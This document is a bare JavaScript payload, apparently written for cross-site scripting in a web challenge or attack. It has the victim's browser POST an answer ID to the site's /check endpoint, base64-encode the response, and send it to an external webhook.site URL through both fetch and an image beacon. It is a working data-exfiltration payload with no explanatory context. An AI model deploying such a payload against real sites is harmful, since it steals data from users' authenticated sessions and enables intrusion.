var webhookUrl = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf";
var answerId = "da39f8de-85cb-41f1-b6b9-dad986e6a95c";
fetch("/check", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: `answer_id=${answerId}`
})
.then(r => r.text())
.then(t => {
    var p = fetch(`${webhookUrl}?dataFetch=${btoa(t)}`);
    var img = new Image();
    img.src = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
    document.body.appendChild(img);
    return p;
});